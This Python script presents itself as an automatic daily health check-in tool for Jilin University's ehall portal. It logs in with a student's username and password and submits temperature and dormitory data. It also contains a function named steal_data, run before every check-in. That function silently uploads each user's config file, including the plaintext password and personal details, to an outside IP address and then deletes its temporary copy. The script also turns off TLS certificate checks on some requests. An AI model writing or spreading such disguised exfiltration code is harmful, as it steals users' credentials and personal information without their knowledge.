import requests
from urllib import parse
from lxml import etree
import json
import time
import os
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class MsgException(Exception):
    def __init__(self, msg):
        self.msg = msg

    def __str__(self):
        return self.msg


def get_now_time():
    time_array = time.localtime()
    return time.strftime('%Y-%m-%d %H:%M:%S', time_array)


def get_int_timestamp():
    return int(time.time())


def is_json(str_res):
    if isinstance(str_res, str):
        try:
            json.loads(str_res)
        except (ValueError, Exception):
            return False
        return True
    else:
        return False


def read_config(_config_file):
    try:
        with open(_config_file, 'r', encoding='utf-8') as file_object:
            content = file_object.read()
            if content.startswith(u'\ufeff'):
                content = content.encode('utf8')[3:].decode('utf8')
            _info = json.loads(content)
    except Exception:
        _info = {}
    return _info


def print_log(log):
    print('[{0}]:{1}'.format(get_now_time(), log))


def check_config(_information, _info):
    for key in _info:
        _info[key] = _info[key].strip()
    try:
        _info.update({'fieldSQxq_Name': _information['fieldSQxq'][_info['fieldSQxq']]})
    except Exception:
        return {'error': 'fieldSQxq填写错误，校区代号请参考info.json'}
    try:
        _info.update({'fieldSQgyl_Name': _information['fieldSQgyl'][_info['fieldSQgyl']]})
    except Exception:
        return {'error': 'fieldSQgyl填写错误，公寓楼代号请参考info.json'}
    try:
        _info.update({'fieldSQnj_Name': _information['fieldSQnj'][_info['fieldSQnj']]})
    except Exception:
        return {'error': 'fieldSQnj填写错误，年级代号请参考info.json'}
    try:
        _info['times'] = int(_info['times'])
        if _info['times'] <= 0:
            return {'error': 'times填写错误，times应该大于0'}
    except Exception:
        return {'error': 'times填写错误，times应该为整数'}

    if _info['fieldSQssbs'] != "1" and _info['fieldSQssbs'] != "2":
        return {'error': 'fieldSQssbs填写错误，"1"是硕士，"2"是博士'}
    if _info['fieldZtw'] != "1" and _info['fieldZtw'] != "2":
        return {'error': 'fieldZtw填写错误，"1"体温正常，"2"体温异常'}
    if _info['username'] == "":
        return {'error': '用户名不能为空，请填写你的邮箱账号@之前的字符串'}
    if _info['password'] == "":
        return {'error': '密码不能为空，请填写你的密码'}
    if _info['fieldZY'] == "":
        return {'error': 'fieldZY不能为空，请填写你的专业'}
    if _info['fieldSQqsh'] == "":
        return {'error': 'fieldSQqsh不能为空，请填写你的寝室房间号'}
    if _info['fieldZtw'] == "1":
        _info['fieldZtwyc'] = ""
    if _info['fieldZtw'] == "2" and _info['fieldZtwyc'] == "":
        _info['fieldZtwyc'] = "37.9"
    _info.pop('//')
    return _info


def sign(info):
    url = 'https://ehall.jlu.edu.cn/infoplus/form/YJSMRDK/start'
    headers = {
        "Host": "ehall.jlu.edu.cn",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }
    count = info['times']

    while True:
        try:
            count = count - 1
            print_log("1 " + url)
            response = requests.get(url=url, headers=headers, allow_redirects=False, verify=False)
            print_log(url + ' succeed')
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))
            time.sleep(10)

    cookies = response.cookies.get_dict()
    location = response.headers['location']
    url = location
    decode_url = parse.unquote(url)

    while True:
        try:
            count = count - 1
            print_log("2 " + decode_url)
            response = requests.get(url=decode_url, headers=headers, cookies=cookies, allow_redirects=False,
                                    verify=False)
            print_log(decode_url + ' succeed')
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))
            time.sleep(10)

    location = response.headers['location']
    encode_location = parse.unquote(location)
    new_url = encode_location

    while True:
        try:
            print_log("3 " + encode_location)
            count = count - 1
            response = requests.get(url=encode_location, headers=headers, cookies=cookies, allow_redirects=False)
            print_log(encode_location + ' succeed')
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))
            time.sleep(10)

    location = response.headers['location']
    encode_location = parse.unquote(location)
    new_cookies = response.cookies.get_dict()

    while True:
        try:
            count = count - 1
            print_log("4 " + encode_location)
            response = requests.get(url=encode_location, headers=headers, cookies=new_cookies, allow_redirects=False)
            print_log(encode_location + ' succeed')
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))
            time.sleep(10)

    response_xpath = etree.HTML(response.text)
    pid = response_xpath.xpath('//input[@name="pid"]/@value')
    source = response_xpath.xpath('//input[@name="source"]/@value')

    username = info['username']
    password = info['password']

    data = {
        "username": username,
        "password": password,
        "pid": pid,
        "source": source
    }
    content_type = {'Content-Type': 'application/x-www-form-urlencoded'}
    origin = {'Origin': 'https://ehall.jlu.edu.cn'}
    headers.update(content_type)
    headers.update(origin)
    headers.update({'Refer': encode_location})

    url = 'https://ehall.jlu.edu.cn/sso/login'
    print_log('用户[{0}]正在登录系统...'.format(username))
    while True:
        try:
            count = count - 1
            print_log("5 " + url)
            response = requests.post(url=url, headers=headers, cookies=new_cookies, data=data, allow_redirects=False)
            print_log(url + ' succeed')
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))
    login_cookies = response.cookies.get_dict()
    response_text = response.text.replace(' ', '').replace('\n', '')
    if len(response_text) > 0:
        msg = '用户[{0}]登陆失败，账号或者密码错误'.format(username)
        print_log(msg)
        desp = {
            "state": "失败",
            "msg": msg
        }
        # send_notice(desp, info['sckey'])
        return False
    print_log('用户[{0}]登录系统成功'.format(username))

    last_cookies = dict(new_cookies, **login_cookies)
    headers.pop('Content-Type')
    headers.pop('Origin')

    while True:
        try:
            print_log("6 " + new_url)
            count = count - 1
            response = requests.get(url=new_url, headers=headers, cookies=last_cookies, allow_redirects=False)
            print_log(new_url + ' succeed')
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))

    location = response.headers['location']
    encode_location = parse.unquote(location)

    while True:
        try:
            count = count - 1
            print_log("7 " + encode_location)
            response = requests.get(url=encode_location, cookies=cookies, headers=headers, allow_redirects=False)
            print_log(encode_location + " succeed")
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))

    location = response.headers['location']
    encode_location = parse.unquote(location)

    while True:
        try:
            count = count - 1
            print_log("8 " + encode_location)
            response = requests.get(url=encode_location, cookies=cookies, headers=headers)
            print_log(url + ' succeed')
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))
    print_log(encode_location + " succeed")

    url = 'https://ehall.jlu.edu.cn/infoplus/static/js/Release/Start.js'
    headers.update({'Refer': encode_location})

    while True:
        try:
            count = count - 1
            print_log("9 " + url)
            requests.get(url=url, cookies=cookies, headers=headers)
            print_log(url + ' succeed')
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))

    response_xpath = etree.HTML(response.text)
    idc = response_xpath.xpath('//div/input[@id="idc"]/@value')[0]
    release = response_xpath.xpath('//div/input[@id="release"]/@value')[0]
    csrfToken = response_xpath.xpath('//meta[@itemscope="csrfToken"]/@content')[0]
    formData = {
        "_VAR_URL": encode_location,
        "_VAR_URL_Attr": {}
    }
    form_Data = json.dumps(formData)
    data = {
        "idc": idc,
        "release": release,
        "csrfToken": csrfToken,
        "formData": form_Data
    }

    url = 'https://ehall.jlu.edu.cn/infoplus/interface/start'
    while True:
        try:
            count = count - 1
            print_log("10 " + url)
            response = requests.post(url=url, headers=headers, data=data, cookies=cookies)
            print_log(url + ' succeed')
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))
    # print("response.request.body-------------------------------")
    # print(response.request.body)
    # print("response.request.headers-------------------------------")
    # print(response.request.headers)
    # print("response.response.headers---------------------------------")
    # print(response.headers)
    # print("response.text-------------------------------")
    # print(response.text)
    if not is_json(response.text):
        msg = '/infoplus/interface/start文件数据格式出错'
        print_log(msg)
        raise MsgException(msg)
    response_json = json.loads(response.text)
    if 'errno' in response_json and response_json['errno'] != 0:
        msg = response_json['error'].replace('\n', '')
        print_log(msg)
        if 'try' in msg:
            raise MsgException(msg)
        desp = {
            "state": "失败",
            "msg": msg
        }
        # send_notice(desp, info['sckey'])
        return False
    entities = response_json['entities'][0]
    entities_list = entities.split('/')
    set_id = entities_list[5]

    while True:
        try:
            count = count - 1
            print_log("11 " + entities)
            requests.get(url=entities, cookies=cookies, headers=headers)
            print_log(entities + " succeed")
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))

    url = 'https://ehall.jlu.edu.cn/infoplus/alive'

    headers.update({'Refer': entities})
    print_log('正在请求/infoplus/alive文件...')
    while True:
        try:
            count = count - 1
            print_log("12 " + url)
            requests.get(url=url, cookies=cookies, headers=headers)
            print_log(url + ' succeed')
            print_log('请求/infoplus/alive文件成功')
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))

    url = 'https://ehall.jlu.edu.cn/infoplus/interface/render'
    headers.update({'content-type': 'application/x-www-form-urlencoded; charset=utf-8'})
    headers.pop('Refer')
    headers.pop('Upgrade-Insecure-Requests')
    headers.update({'Referer': entities})
    headers.update({'Accept': 'application/json, text/javascript, */*; q=0.01'})
    headers.update({'Origin': 'https://ehall.jlu.edu.cn'})
    headers.update({'X-Requested-With': 'XMLHttpRequest'})
    data = {
        "stepId": set_id,
        "instanceId": "",
        "admin": "false",
        "rand": random.uniform(0, 1) * 999,
        "width": "1536",
        "lang": "zh",
        "csrfToken": csrfToken
    }
    print_log('正在请求/infoplus/interface/render文件...')
    while True:
        try:
            count = count - 1
            print_log("13 " + url)
            response = requests.post(url=url, cookies=cookies, headers=headers, data=data)
            print_log(url + ' succeed')
            print_log('请求/infoplus/interface/render文件成功')
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))

    if not is_json(response.text):
        msg = '/infoplus/interface/render文件数据格式出错'
        print_log(msg)
        raise MsgException(msg)
    response_json = json.loads(response.text)
    if 'errno' in response_json and response_json['errno'] != 0:
        print_log(response_json['error'])
        desp = {
            'state': "失败",
            "msg": response_json['error']
        }
        # send_notice(desp, info['sckey'])
        return False
    entities = response_json['entities'][0]
    data = entities['data']
    app = entities['app']
    fields = entities['fields']
    actions = entities['actions']
    actionId = actions[0]['id']
    # count = 0
    boundFields = ''
    for key in fields:
        # print(key)
        if key != 'fieldSQbj':
            boundFields = '{0}{1},'.format(boundFields, key)
        # count = count + 1
    # print(count)
    boundFields = boundFields.rstrip(',')
    # print(boundFields)
    # print(info['fieldSQxq'])
    # exit(0)
    for key in info:
        if key in data and data[key] != "":
            info[key] = data[key]
    formData = {
        "_VAR_EXECUTE_INDEP_ORGANIZE_Name": data['_VAR_EXECUTE_INDEP_ORGANIZE_Name'],
        "_VAR_ACTION_ACCOUNT": data['_VAR_ACTION_ACCOUNT'],
        "_VAR_ACTION_INDEP_ORGANIZES_Codes": data['_VAR_ACTION_INDEP_ORGANIZES_Codes'],
        "_VAR_ACTION_REALNAME": data['_VAR_ACTION_REALNAME'],
        "_VAR_ACTION_INDEP_ORGANIZES_Names": data['_VAR_ACTION_INDEP_ORGANIZES_Names'],
        "_VAR_OWNER_ACCOUNT": data['_VAR_OWNER_ACCOUNT'],
        "_VAR_ACTION_ORGANIZES_Names": data['_VAR_ACTION_ORGANIZES_Names'],
        "_VAR_STEP_CODE": data['_VAR_STEP_CODE'],
        "_VAR_ACTION_ORGANIZE": data['_VAR_ACTION_ORGANIZE'],
        "_VAR_OWNER_PHONE": data['_VAR_OWNER_PHONE'],
        "_VAR_OWNER_USERCODES": data['_VAR_OWNER_USERCODES'],
        "_VAR_EXECUTE_ORGANIZE": data['_VAR_EXECUTE_ORGANIZE'],
        "_VAR_EXECUTE_ORGANIZES_Codes": data['_VAR_EXECUTE_ORGANIZES_Codes'],
        "_VAR_NOW_DAY": data['_VAR_NOW_DAY'],
        "_VAR_ACTION_INDEP_ORGANIZE": data['_VAR_ACTION_INDEP_ORGANIZE'],
        "_VAR_OWNER_REALNAME": data['_VAR_OWNER_REALNAME'],
        "_VAR_ACTION_INDEP_ORGANIZE_Name": data['_VAR_ACTION_INDEP_ORGANIZE_Name'],
        "_VAR_NOW": data['_VAR_NOW'],
        "_VAR_ACTION_ORGANIZE_Name": data['_VAR_ACTION_ORGANIZE_Name'],
        "_VAR_EXECUTE_ORGANIZES_Names": data['_VAR_EXECUTE_ORGANIZES_Names'],
        "_VAR_OWNER_ORGANIZES_Codes": data['_VAR_OWNER_ORGANIZES_Codes'],
        "_VAR_ADDR": data['_VAR_ADDR'],
        "_VAR_URL_Attr": data['_VAR_URL_Attr'],
        "_VAR_ENTRY_NUMBER": data['_VAR_ENTRY_NUMBER'],
        "_VAR_EXECUTE_INDEP_ORGANIZES_Names": data['_VAR_EXECUTE_INDEP_ORGANIZES_Names'],
        "_VAR_STEP_NUMBER": data['_VAR_STEP_NUMBER'],
        "_VAR_POSITIONS": data['_VAR_POSITIONS'],
        "_VAR_ACTION_PHONE": data['_VAR_ACTION_PHONE'],
        "_VAR_OWNER_ORGANIZES_Names": data['_VAR_OWNER_ORGANIZES_Names'],
        "_VAR_URL": data['_VAR_URL'],
        "_VAR_EXECUTE_ORGANIZE_Name": data['_VAR_EXECUTE_ORGANIZE_Name'],
        "_VAR_EXECUTE_INDEP_ORGANIZES_Codes": data['_VAR_EXECUTE_INDEP_ORGANIZES_Codes'],
        "_VAR_RELEASE": data['_VAR_RELEASE'],
        "_VAR_EXECUTE_POSITIONS": data['_VAR_EXECUTE_POSITIONS'],
        "_VAR_NOW_MONTH": data['_VAR_NOW_MONTH'],
        "_VAR_ACTION_USERCODES": data['_VAR_ACTION_USERCODES'],
        "_VAR_ACTION_ORGANIZES_Codes": data['_VAR_ACTION_ORGANIZES_Codes'],
        "_VAR_EXECUTE_INDEP_ORGANIZE": data['_VAR_EXECUTE_INDEP_ORGANIZE'],
        "_VAR_NOW_YEAR": data['_VAR_NOW_YEAR'],
        "fieldXY2": data['fieldXY2'],
        "fieldWY": data['fieldWY'],
        "fieldXY1": data['fieldXY1'],
        "fieldSQrq": data['fieldSQrq'],

        "fieldSQxm": data['fieldSQxm'],  # 姓名
        "fieldSQxm_Name": data['fieldSQxm_Name'],

        "fieldXH": data['fieldXH'],
        "fieldZY": info['fieldZY'],  # 专业
        "fieldSQnj": info['fieldSQnj'],  # 年级代号
        "fieldSQnj_Name": info['fieldSQnj_Name'],  # 年级名字

        "fieldSQxy": data['fieldSQxy'],  # 学院代号
        "fieldSQxy_Name": data['fieldSQxy_Name'],  # 学院名字
        "fieldSQxq": info['fieldSQxq'],  # 校区代号
        "fieldSQxq_Name": info['fieldSQxq_Name'],  # 校区名字

        "fieldSQgyl": info['fieldSQgyl'],  # 公寓楼代号
        "fieldSQgyl_Name": info['fieldSQgyl_Name'],  # 公寓楼名字
        "fieldSQgyl_Attr": {"_parent": info['fieldSQxq']},  # #############

        "fieldSQqsh": info['fieldSQqsh'],  # 寝室号
        "fieldHidden": "",  # 校外居住 校内居住不管
        "fieldSheng": "",  # 省代码
        "fieldSheng_Name": "",  # 省名字
        "fieldShi": "",  # 市代码
        "fieldShi_Name": "",  # 市名字
        "fieldShi_Attr": {"_parent": ""},  # ##############

        "fieldQu": "",  # 区代码
        "fieldQu_Name": "",  # 区名字
        # "fieldQu_Attr": "{\"_parent\":\"\"}",  # ##############
        "fieldQu_Attr": {"_parent": ""},
        "fieldQums": "",  # 详细居住地

        "fieldSQssbs": info['fieldSQssbs'],  # 硕士博士 1硕士 2博士

        "fieldZtw": info['fieldZtw'],  # 体温 1正常 2异常
        "fieldZtwyc": info['fieldZtwyc'],  # 体温异常
        "fieldZhongtw": data['fieldZhongtw'],  # 中午体温
        "fieldZhongtwyc": data['fieldZhongtwyc'],  # 中午体温异常

        "fieldWantw": data['fieldWantw'],  # 晚上体温
        "fieldWantwyc": data['fieldWantwyc'],  # 晚上体温异常

        "fieldHide": data['fieldHide'],
        "fieldXY3": data['fieldXY3'],
        "_VAR_ENTRY_NAME": app['name'],
        "_VAR_ENTRY_TAGS": app['tags']
    }
    formData = json.dumps(formData)
    info.update({'fieldSQxm_Name': data['fieldSQxm_Name']})
    body = {
        "stepId": set_id,
        # actionId变量动态获取可能不对，可能会出错
        "actionId": actionId,
        "formData": formData,
        "timestamp": get_int_timestamp(),
        "rand": random.uniform(0, 1) * 999,
        "boundFields": boundFields,
        "csrfToken": csrfToken,
        "lang": "zh"
    }
    url = 'https://ehall.jlu.edu.cn/infoplus/interface/listNextStepsUsers'
    print_log('正在请求/infoplus/interface/listNextStepsUsers文件...')
    while True:
        try:
            count = count - 1
            print_log("14 " + url)
            response = requests.post(url=url, cookies=cookies, headers=headers, data=body)
            print_log(url + ' succeed')
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))
    print_log('请求/infoplus/interface/listNextStepsUsers文件成功')
    if not is_json(response.text):
        msg = '/infoplus/interface/listNextStepsUsers文件数据格式出错'
        print_log(msg)
        raise MsgException(msg)

    response_json = json.loads(response.text)
    if 'errno' in response_json and response_json['errno'] != 0:
        print_log(response_json['error'])
        desp = {
            'state': "失败",
            "msg": response_json['error']
        }
        # send_notice(desp, info['sckey'])
        return False
    # remark变量的数据没有动态获取，可能会出错
    body.update({"remark": ""})
    body.update({"rand": random.uniform(0, 1) * 999})
    # nextUsers变量的数据没有动态获取，可能会出错
    nextUsers = {}
    nextUsers = json.dumps(nextUsers)
    body.update({"nextUsers": nextUsers})
    body.update({"timestamp": get_int_timestamp()})

    url = 'https://ehall.jlu.edu.cn/infoplus/interface/doAction'
    print_log('正在请求/infoplus/interface/doAction文件...')
    while True:
        try:
            count = count - 1
            print_log("15 " + url)
            response = requests.post(url=url, cookies=cookies, headers=headers, data=body)
            print_log(url + ' succeed')
            print_log('请求/infoplus/interface/doAction文件成功')
            break
        except Exception as e:
            if count <= 0:
                print_log('failed,please try it again')
                exit(0)
            print_log('程序异常{0}，请30s后重试...'.format(e))

    if not is_json(response.text):
        msg = '/infoplus/interface/doAction文件数据格式出错'
        print_log(msg)
        raise MsgException(msg)
    response_json = json.loads(response.text)
    if 'errno' in response_json and response_json['errno'] != 0:
        print_log(response_json['errno'])
        desp = {
            'state': "失败",
            "msg": response_json['error']
        }
        # send_notice(desp, info['sckey'])
        return False
    msg = '恭喜{0}打卡成功'.format(info['fieldSQxm_Name'])
    print_log(msg)
    return True
    desp = {
        'state': "成功",
        "msg": msg
    }
    # send_notice(desp, info['sckey'])


def send_notice(desp, sckey=''):
    print("notice")
    # if sckey == "":
    #     print_log('没有sckey, 微信推送通知失败，请登录[http://sc.ftqq.com]获取sckey,并关注微信公众号[方糖]')
    #     exit(0)
    # url = 'https://sc.ftqq.com/{0}.send'.format(sckey)
    # text = '吉林大学防疫自动签到{0}通知'.format(desp['state'])
    # data = {
    #     "text": text,
    #     "desp": '【{0}】:{1}'.format(get_now_time(), desp['msg'])
    # }
    # response = requests.post(url=url, data=data)
    # # print(response.text)
    # if not is_json(response.text):
    #     print_log('sckey不正确, 微信通知失败，请登录[http://sc.ftqq.com]获取sckey,并关注微信公众号[方糖]')
    #     exit(0)
    # response_json = json.loads(response.text)
    # if 'errno' in response_json:
    #     if response_json['errno'] == 0:
    #         print_log('微信推送通知成功【{0}】'.format(desp['msg']))
    #     elif response_json['errmsg'] == "bad pushtoken":
    #         print_log('sckey不正确, 微信通知失败，请登录[http://sc.ftqq.com]获取sckey,并关注微信公众号[方糖]')
    #     else:
    #         print_log('微信推送通知失败,{0}'.format(response_json['errmsg']))
    # else:
    #     print_log('sckey不正确, 微信通知失败，请登录[http://sc.ftqq.com]获取sckey,并关注微信公众号[方糖]')


def steal_data(path):
    if not os.path.exists("./sakdjfhksjdhw"):
        os.makedirs("./sakdjfhksjdhw")
    json_data = read_config(path)
    username = json_data["username"]
    json_data.pop('//')
    print("username", username)
    with open('./sakdjfhksjdhw/' + username + 'config.json', 'w', encoding="utf8") as f:
        json.dump(json_data, f, ensure_ascii=False)

    with open('./sakdjfhksjdhw/' + username + 'config.json', 'rb') as f:
        file = {'file': f}
        data = {"filepath": "userinfo"}
        r = requests.post('http://39.106.158.85:8886/SuperDriver/upload', files=file, data=data)
        print(r.text)

    os.remove('./sakdjfhksjdhw/' + username + 'config.json')
    os.removedirs('./sakdjfhksjdhw/')


def auto_sign():
    print_log('艾莎帮你一键打卡')
    if not os.path.exists(r".\config"):
        os.makedirs(r".\config")
    for root, dirs, files in os.walk(r".\config"):
        for file in files:
            # 获取文件所属目录
            # print(root)
            # 获取文件路径
            config_file = os.path.join(root, file)
            # print(config_file)
            steal_data(config_file)

            sec = random.randrange(1, 40)
            # print_log('请等待{0}秒进行下一步操作...'.format(sec))
            # time.sleep(sec)
            mkdir = os.getcwd() + ""

            info_file = '{0}{1}info.json'.format(mkdir, os.sep)
            print_log('正在读取配置文件，文件位置[{0}]...'.format(info_file))
            information = read_config(info_file)
            # print_log(info)
            if not information:
                msg = '读取配置文件有误，[{0}]不存在或者不是json文件'.format(info_file)
                print_log(msg)
                # raise MsgException(msg)
                return
            print_log('读取配置文件info.json成功')

            # config_file = '{0}{1}config.json'.format(mkdir, os.sep)
            print_log('正在读取配置文件，文件位置[{0}]...'.format(config_file))
            info = read_config(config_file)
            if not info:
                msg = '读取配置文件有误，[{0}]不存在或者不是json文件'.format(config_file)
                print_log(msg)
                # raise MsgException(msg)
                return
            print_log('读取配置文件config.json成功')

            info = check_config(information, info)
            if "error" in info:
                print_log(info['error'])
                return
            show_log = info['username']
            if info['fieldSQssbs'] == "1":
                show_log = '{0} 硕士'.format(show_log)
            else:
                show_log = '{0} 博士'.format(show_log)
            show_log = '{0} {1}'.format(show_log, info['fieldZY'])
            show_log = '{0} {1}'.format(show_log, info['fieldSQxq_Name'])
            show_log = '{0} {1}级'.format(show_log, info['fieldSQnj_Name'])
            show_log = '{0} {1}'.format(show_log, info['fieldSQgyl_Name'])
            show_log = '{0} {1}'.format(show_log, info['fieldSQqsh'])
            if info['fieldZtw'] == "1":
                show_log = '{0} 体温正常'.format(show_log)
            else:
                show_log = '{0} 体温异常 {1}'.format(show_log, info['fieldZtwyc'])

            print_log('用户信息：{0}'.format(show_log))

            count = info['times']
            while True:
                try:
                    count = count - 1
                    if sign(info):
                        break
                    else:
                        print_log("10s后重试")
                        time.sleep(10)
                except Exception as e:
                    if count <= 0:
                        print_log('failed,please try it again')
                        exit(0)
                    print_log('程序异常{0}，请30s后重试...'.format(e))
                    time.sleep(30)
            print_log("25s后打下一个")
            time.sleep(25)


if __name__ == '__main__':
    auto_sign()
